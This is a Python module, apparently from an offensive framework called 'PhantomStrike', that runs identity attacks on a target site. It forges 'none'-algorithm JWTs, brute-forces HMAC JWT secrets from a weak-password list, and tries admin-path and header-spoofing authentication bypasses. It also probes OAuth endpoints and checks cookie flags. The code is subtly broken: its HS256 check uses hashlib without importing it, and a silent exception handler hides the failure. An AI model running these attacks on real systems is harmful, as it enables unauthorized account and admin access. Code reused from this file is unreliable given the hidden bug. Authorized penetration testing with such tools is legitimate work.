"""
PhantomStrike Identity Attack Engine — JWT forgery, OAuth abuse,
session hijacking, token manipulation, and auth bypass testing.
"""
from __future__ import annotations
import asyncio
import base64
import json
import logging
import time
from datetime import datetime
from typing import Optional

import aiohttp

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.identity")

# Common JWT secrets to test
JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "key", "jwt_secret", "changeme",
    "mysecret", "test", "default", "admin", "supersecret", "1234567890",
    "your-256-bit-secret", "hmac-secret", "HS256-secret", "",
    "jwt", "token", "auth", "private_key", "app_secret",
]

# None algorithm attack
JWT_NONE_HEADERS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
    {"alg": "nOnE", "typ": "JWT"},
]


class IdentityEngine(BaseModule):
    """Identity-first attack engine — JWT, OAuth, session, auth bypass."""

    @property
    def name(self) -> str:
        return "phantom-identity"

    @property
    def description(self) -> str:
        return "Identity attacks — JWT forgery, OAuth abuse, auth bypass"

    @property
    def category(self) -> str:
        return "identity"

    async def _setup(self):
        self._session: Optional[aiohttp.ClientSession] = None

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run identity attack suite."""
        options = options or {}
        self.status = ModuleStatus.RUNNING
        start_time = datetime.now()

        if not target.startswith("http"):
            target = f"https://{target}"

        findings = {
            "target": target,
            "jwt_vulns": [],
            "oauth_vulns": [],
            "session_vulns": [],
            "auth_bypass": [],
        }

        self._session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0.0.0"},
        )

        try:
            jwt_token = options.get("jwt_token", "")
            tasks = [
                self._test_auth_bypass(target, findings),
                self._discover_oauth_endpoints(target, findings),
                self._test_session_issues(target, findings),
            ]
            if jwt_token:
                tasks.append(self._test_jwt_vulns(target, jwt_token, findings))
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"[IDENTITY] Error: {e}")
        finally:
            if self._session:
                await self._session.close()

        total = sum(len(findings[k]) for k in findings if isinstance(findings[k], list))
        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name, operation="identity_scan",
            success=True, data=findings, findings_count=total,
            start_time=start_time, end_time=datetime.now(),
        )

    async def _test_jwt_vulns(self, target: str, token: str, findings: dict):
        """Test JWT token for common vulnerabilities."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            # Decode header and payload
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            logger.info(f"[IDENTITY] JWT Header: {header}")
            logger.info(f"[IDENTITY] JWT Payload: {json.dumps(payload, indent=2)}")

            # Test 1: None algorithm attack
            for none_header in JWT_NONE_HEADERS:
                none_h_b64 = base64.urlsafe_b64encode(
                    json.dumps(none_header).encode()
                ).rstrip(b"=").decode()
                forged = f"{none_h_b64}.{parts[1]}."

                try:
                    async with self._session.get(
                        target,
                        headers={"Authorization": f"Bearer {forged}"},
                    ) as resp:
                        if resp.status in (200, 201, 204):
                            vuln = {
                                "type": "jwt_none_algorithm",
                                "severity": "critical",
                                "forged_token": forged,
                                "description": "JWT accepts 'none' algorithm — can forge any token!",
                            }
                            findings["jwt_vulns"].append(vuln)
                            await self.event_bus.emit(Event(
                                type=EventType.VULN_FOUND,
                                data=vuln, source=self.name, severity="critical",
                            ))
                            logger.info("[IDENTITY] 🔴 JWT None Algorithm ACCEPTED!")
                            break
                except Exception:
                    pass

            # Test 2: Weak secret brute force (HS256)
            if header.get("alg", "").startswith("HS"):
                import hmac
                signing_input = f"{parts[0]}.{parts[1]}".encode()
                original_sig = parts[2]

                for secret in JWT_WEAK_SECRETS:
                    try:
                        if header["alg"] == "HS256":
                            sig = base64.urlsafe_b64encode(
                                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                            ).rstrip(b"=").decode()
                        elif header["alg"] == "HS384":
                            import hashlib as hl
                            sig = base64.urlsafe_b64encode(
                                hmac.new(secret.encode(), signing_input, hl.sha384).digest()
                            ).rstrip(b"=").decode()
                        else:
                            continue

                        if sig == original_sig:
                            vuln = {
                                "type": "jwt_weak_secret",
                                "severity": "critical",
                                "secret": secret,
                                "description": f"JWT secret cracked: '{secret}'",
                            }
                            findings["jwt_vulns"].append(vuln)
                            logger.info(f"[IDENTITY] 🔴 JWT Secret CRACKED: '{secret}'")
                            break
                    except Exception:
                        pass

            # Test 3: Check for expired but still accepted tokens
            if "exp" in payload:
                exp_time = payload["exp"]
                if exp_time < time.time():
                    try:
                        async with self._session.get(
                            target,
                            headers={"Authorization": f"Bearer {token}"},
                        ) as resp:
                            if resp.status in (200, 201, 204):
                                findings["jwt_vulns"].append({
                                    "type": "jwt_expired_accepted",
                                    "severity": "high",
                                    "description": "Expired JWT still accepted!",
                                })
                    except Exception:
                        pass

        except Exception as e:
            logger.debug(f"[IDENTITY] JWT analysis error: {e}")

    async def _test_auth_bypass(self, target: str, findings: dict):
        """Test for authentication bypass techniques."""
        bypass_paths = [
            "/admin", "/admin/", "/ADMIN", "/Admin",
            "/admin;/", "/admin/./", "/admin..;/",
            "/%2fadmin", "/admin%00", "/admin%20",
            "/./admin", "/../admin", "/admin/~",
        ]

        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]

        # Test path-based bypasses
        for path in bypass_paths:
            try:
                url = f"{target}{path}"
                async with self._session.get(url) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if any(w in body.lower() for w in ["dashboard", "admin panel", "settings"]):
                            findings["auth_bypass"].append({
                                "type": "path_bypass",
                                "path": path,
                                "severity": "critical",
                            })
                            logger.info(f"[IDENTITY] 🔴 Auth Bypass: {path}")
            except Exception:
                pass

        # Test header-based bypasses
        for headers in bypass_headers:
            try:
                async with self._session.get(f"{target}/admin", headers=headers) as resp:
                    if resp.status == 200:
                        findings["auth_bypass"].append({
                            "type": "header_bypass",
                            "headers": headers,
                            "severity": "critical",
                        })
            except Exception:
                pass

    async def _discover_oauth_endpoints(self, target: str, findings: dict):
        """Discover and test OAuth/OpenID endpoints."""
        oauth_paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/oauth/authorize", "/oauth/token",
            "/auth/realms/master", "/auth/login",
            "/api/oauth/authorize", "/.well-known/jwks.json",
        ]

        for path in oauth_paths:
            try:
                async with self._session.get(f"{target}{path}") as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        findings["oauth_vulns"].append({
                            "type": "oauth_endpoint_found",
                            "path": path,
                            "severity": "info",
                            "details": body[:500],
                        })
                        logger.info(f"[IDENTITY] OAuth endpoint: {path}")
            except Exception:
                pass

    async def _test_session_issues(self, target: str, findings: dict):
        """Test for session management vulnerabilities."""
        try:
            # Check if session cookies have security flags
            async with self._session.get(target) as resp:
                for cookie in resp.cookies.values():
                    issues = []
                    if not getattr(cookie, "secure", True):
                        issues.append("Missing Secure flag")
                    if not getattr(cookie, "httponly", True):
                        issues.append("Missing HttpOnly flag")

                    raw_header = resp.headers.get("Set-Cookie", "")
                    if "SameSite" not in raw_header:
                        issues.append("Missing SameSite attribute")

                    if issues:
                        findings["session_vulns"].append({
                            "cookie_name": cookie.key,
                            "issues": issues,
                            "severity": "medium",
                        })
        except Exception:
            pass
